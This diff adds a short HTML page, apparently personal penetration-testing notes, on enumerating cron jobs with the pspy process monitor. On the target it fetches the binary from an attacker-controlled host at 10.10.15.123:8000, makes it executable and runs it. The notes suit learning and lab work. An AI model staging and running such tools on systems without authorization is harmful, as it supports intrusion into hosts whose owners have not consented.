@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>cron jobs</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>cron jobs</h1><br/><br /><strong><h3>PSPY</h3></strong><br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>DominicBreuker<span style="color:#ff9d00;font-weight:700">/</span>pspy<span style="color:#ff9d00;font-weight:700">/</span>releases<span style="color:#ff9d00;font-weight:700">/</span>download<span style="color:#ff9d00;font-weight:700">/</span>v1.2.0<span style="color:#ff9d00;font-weight:700">/</span>pspy32<br />python3 -m http.server<br /><span style="color:#ff9d00;font-weight:700">wget</span> <span style="color:#3ad900;font-weight:400">&quot;http://10.10.15.123:8000/pspy32&quot;</span>     <span style="color:#0088ff;font-weight:400">#from the target</span><br /><span style="color:#ff9d00;font-weight:700">chmod</span> +x pspy32</pre></div><br />1. <strong>Execute on the target pspy</strong><br />	The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan <a href="https://en.wikipedia.org/wiki/Procfs">profcs</a> every 1000ms (or every second).<br />	Wait some minutes waiting if some commands are running<br />	<div class="codebox"><pre>.<span style="color:#ff9d00;font-weight:700">/</span>pspy32 -pf -i 1000</pre></div><br />	<a href=""><img src="images/2677-1.png" alt="images/2677-1.png" /></a><br /><br /><br /><br /></div>
+</body>
+</html>
